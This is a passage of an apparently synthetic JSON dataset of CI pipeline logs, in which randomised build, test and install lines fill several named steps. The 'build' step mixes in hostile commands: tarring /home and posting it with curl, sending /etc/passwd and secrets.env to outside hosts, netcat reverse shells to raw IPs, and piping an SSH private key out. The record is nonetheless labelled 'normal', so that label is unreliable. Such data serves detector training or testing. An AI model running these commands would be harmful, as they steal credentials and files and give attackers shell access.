          "  PASS: test_auth_login (394ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing express@1.17.0",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-7141",
          "\u2713 test completed",
          "  PASS: test_user_create (266ms)",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "FAILED: test_db_connect",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (395ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Cache hit for key-4247",
          "[12:00:35] INFO: Processing request",
          "Installing webpack@5.11.0",
          "  PASS: test_auth_login (268ms)",
          "  PASS: test_user_create (353ms)",
          "Step 8/10: Building",
          "Exception: ValueError",
          "Cache hit for key-9682",
          "  PASS: test_auth_login (244ms)",
          "Exception: TypeError",
          "Installing express@2.18.0",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_cache_hit (278ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (214ms)",
          "Installing lodash@1.2.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_api_health (415ms)",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Step 4/10: Building",
          "Installing react@3.8.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-5582",
          "FAILED: test_auth_login",
          "Installing lodash@3.9.0",
          "Step 10/10: Building",
          "Installing eslint@2.12.0",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Step 7/10: Building",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing express@3.13.0",
          "Step 2/10: Building",
          "Installing express@2.4.0",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Installing jest@3.9.0",
          "  PASS: test_cache_hit (317ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Step 7/10: Building",
          "Cache hit for key-2392",
          "\u2713 test completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-24T12:02:08.560199",
        "finished_at": "2025-11-24T12:02:17.910306",
        "log_lines": [
          "=== Step: setup_node ===",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "  PASS: test_api_health (158ms)",
          "Cache hit for key-7833",
          "  PASS: test_auth_login (116ms)",
          "Step 7/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_user_create (79ms)",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "Installing webpack@2.19.0",
          "  PASS: test_auth_login (333ms)",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Installing react@2.18.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 3/10: Building",
          "Cache hit for key-2787",
          "  PASS: test_user_create (142ms)",
          "[12:00:35] ERROR: Connection failed",
          "  PASS: test_api_health (400ms)",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Installing axios@3.12.0",
          "Installing express@5.3.0",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing jest@4.4.0",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing prettier@1.9.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "Exception: TypeError",
          "Step 9/10: Building",
          "Cache hit for key-9581",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-3821",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@5.4.0",
          "Installing prettier@3.9.0",
          "  PASS: test_user_create (313ms)",
          "  PASS: test_user_create (252ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] ERROR: Connection failed",
          "  PASS: test_cache_hit (262ms)",
          "Step 7/10: Building",
          "Cache hit for key-1807",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "  PASS: test_api_health (345ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (28ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-6612",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-3341",
          "\u2713 lint completed",
          "Cache hit for key-5479",
          "Cache hit for key-2659",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 8/10: Building",
          "Installing express@5.10.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-24T12:02:17.910306",
        "finished_at": "2025-11-24T12:02:21.650349",
        "log_lines": [
          "=== Step: checkout ===",
          "  PASS: test_auth_login (288ms)",
          "  PASS: test_db_connect (402ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/index.js...",
          "Installing axios@1.8.0",
          "Cache hit for key-6710",
          "  PASS: test_user_create (425ms)",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Step 2/10: Building",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (144ms)",
          "Step 2/10: Building",
          "Cache hit for key-4013",
          "Step 2/10: Building",
          "  PASS: test_auth_login (15ms)",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 5/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_auth_login (252ms)",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (281ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (267ms)",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "Installing axios@1.0.0",
          "  PASS: test_user_create (87ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing prettier@2.19.0",
          "Compiling src/main.py...",
          "Installing prettier@1.18.0",
          "Cache hit for key-1139",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (3ms)",
          "Cache hit for key-1335",
          "\u2717 build failed with exit code 8",
          "Cache hit for key-7725",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (108ms)",
          "Cache hit for key-6109",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-7726",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 108",
          "  PASS: test_auth_login (229ms)",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "Installing webpack@4.5.0",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-5594",
          "[12:00:35] INFO: Processing request",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-24T12:02:21.650349",
        "finished_at": "2025-11-24T12:02:49.700671",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (377ms)",
          "Installing eslint@2.4.0",
          "Installing jest@2.0.0",
          "Step 7/10: Building",
          "[12:00:35] ERROR: Connection failed",
          "Exception: NullPointerException",
          "\u2713 build completed",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Exception: ValueError",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (311ms)",
          "  PASS: test_db_connect (382ms)",
          "Installing eslint@3.0.0",
          "  PASS: test_auth_login (203ms)",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (288ms)",
          "Compiling src/handler.rs...",
          "Installing express@4.1.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 test completed",
          "Installing jest@1.7.0",
          "[12:00:35] INFO: Processing request",
          "Exception: RuntimeError",
          "Installing lodash@4.2.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "Installing prettier@5.4.0",
          "Installing prettier@2.17.0",
          "\u2713 lint completed",
          "Installing jest@1.17.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing express@2.16.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing react@1.13.0",
          "Installing react@1.18.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-6405",
          "  PASS: test_cache_hit (215ms)",
          "Step 3/10: Building",
          "Installing lodash@2.12.0",
          "Cache hit for key-2437",
          "Cache hit for key-4401",
          "Installing express@3.17.0",
          "Cache hit for key-6726",
          "\u2713 lint completed",
          "Installing react@2.14.0",
          "Installing react@5.9.0",
          "Cache hit for key-4844",
          "\u2713 lint completed",
          "  PASS: test_user_create (414ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing jest@4.7.0",
          "Exception: ValueError",
          "Installing axios@3.13.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing jest@1.19.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 8/10: Building",
          "  PASS: test_user_create (483ms)",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "Installing eslint@2.18.0",
          "Compiling src/main.py...",
          "[12:00:35] INFO: Processing request",
          "Installing lodash@1.5.0",
          "\u2717 build failed with exit code 67",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 build completed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-24T12:02:49.700671",
        "finished_at": "2025-11-24T12:02:59.050778",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing lodash@1.1.0",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/main.py...",
          "Installing express@3.6.0",
          "Cache hit for key-6691",
          "[12:00:35] ERROR: Connection failed",
          "Cache hit for key-1221",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-1129",
          "Step 4/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "Installing axios@2.18.0",
          "\u2713 build completed",
          "Step 6/10: Building",
          "  PASS: test_api_health (237ms)",
          "Cache hit for key-3307",
          "Installing eslint@3.20.0",
          "  PASS: test_db_connect (348ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (177ms)",
          "Cache hit for key-6581",
          "Step 7/10: Building",
          "Cache hit for key-4772",
          "Cache hit for key-9768",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (11ms)",
          "\u2713 test completed",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 test completed",
          "Cache hit for key-9301",
          "Cache hit for key-9780",
          "Artifact uploaded: build.tar.gz (34MB)",
          "WARNING: lodash has known vulnerabilities",
          "Installing prettier@2.9.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u2713 lint completed",
          "Installing webpack@4.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Cache hit for key-1742",
          "Step 9/10: Building",
          "  PASS: test_db_connect (70ms)",
          "Installing express@1.1.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_cache_hit (343ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@1.15.0",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Cache hit for key-7121",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing axios@5.13.0",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:35] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing webpack@4.2.0",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (433ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_user_create (387ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-5276",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-1365",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-24T12:02:59.050778",
        "finished_at": "2025-11-24T12:03:27.101100",
        "log_lines": [
          "=== Step: build ===",
          "Step 5/10: Building",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Cache hit for key-2160",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_cache_hit (290ms)",
          "  PASS: test_db_connect (10ms)",
          "Sending 299MB of data to acme.corp",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Compiling src/main.py...",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/main.py...",
          "Cache hit for key-8288",
          "Step 10/10: Building",
          "Installing jest@4.12.0",
          "nc -e /bin/sh 203.204.188.12 7314",
          "Cache hit for key-2764",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Sending 246MB of data to acme.corp",
          "\u2713 build completed",
          "  PASS: test_api_health (343ms)",
          "Installing eslint@2.4.0",
          "  PASS: test_auth_login (432ms)",
          "  PASS: test_auth_login (197ms)",
          "Installing webpack@2.15.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 lint completed",
          "Cache hit for key-2171",
          "Artifact uploaded: build.tar.gz (27MB)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Installing lodash@3.0.0",
          "Step 1/10: Building",
          "Cache hit for key-7685",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 112",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-6184",
          "Installing express@5.14.0",
          "Step 10/10: Building",
          "  PASS: test_db_connect (357ms)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "nc -e /bin/sh 247.48.143.138 11381",
          "Cache hit for key-9424",
          "Installing lodash@4.2.0",
          "Compiling src/app.ts...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:35] INFO: Processing request",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing react@1.9.0",
          "\u2713 build completed",
          "Sending 341MB of data to acme.corp",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_cache_hit (466ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_user_create (209ms)",
          "Exception: TypeError",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Sending 185MB of data to acme.corp",
          "  PASS: test_user_create (140ms)",
          "Cache hit for key-7224",
          "  PASS: test_auth_login (417ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (308ms)",
          "Step 5/10: Building",
          "\u2713 test completed",
          "\u2713 lint completed",
          "nc -e /bin/sh 115.192.228.182 64691",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing jest@2.15.0",
          "Installing prettier@1.10.0",
          "[12:00:35] INFO: Processing request",
          "Sending 464MB of data to test.io",
          "Cache hit for key-8785",
          "Sending 47MB of data to example.com",
          "\u2713 lint completed",
          "Sending 345MB of data to cloud.services",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8219",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "  PASS: test_api_health (37ms)",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Cache hit for key-3711",
          "Step 10/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 92.102.117.75 38093",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}